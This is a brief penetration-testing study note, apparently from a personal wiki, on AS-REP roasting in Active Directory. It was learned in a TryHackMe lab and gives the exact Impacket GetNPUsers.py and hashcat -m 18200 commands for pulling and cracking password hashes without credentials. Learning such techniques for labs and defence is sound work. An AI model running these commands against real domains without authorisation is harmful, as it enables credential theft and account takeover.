---
tags: [active-directory, credentials]
tools: [impacket, hashcat]
ports: [88]
os: [windows]
phase: [initial-access, credential-access]
---
# AD - AS-REP roasting

**TL;DR:** Any account with **"Do not require Kerberos pre-authentication"** set will hand you an AS-REP encrypted with the user's password hash — crackable offline. No creds needed, just a username list. Hash type hashcat **18200**.

from: TryHackMe Attacktive Directory — verified vs Impacket docs

## When to use

You have valid usernames (from [[AD - Enumeration]]) but no password. Try this before Kerberoasting — it needs no authentication at all.

## How

```bash
# Request AS-REP for any pre-auth-disabled user in the list
GetNPUsers.py <DOMAIN>/ -usersfile <USERLIST> -no-pass -dc-ip <DC-IP> -format hashcat
# Crack the $krb5asrep$ hash
hashcat -m 18200 asrep.hash <WORDLIST>
```

## Gotchas

- `-no-pass` = unauthenticated; works because pre-auth is off for that account.
- If you have creds, `-request` dumps hashes for all pre-auth-disabled users at once.

## Related

- [[AD - Kerberoasting]] (needs creds), [[AD - Enumeration]]
- [[Passwords]]
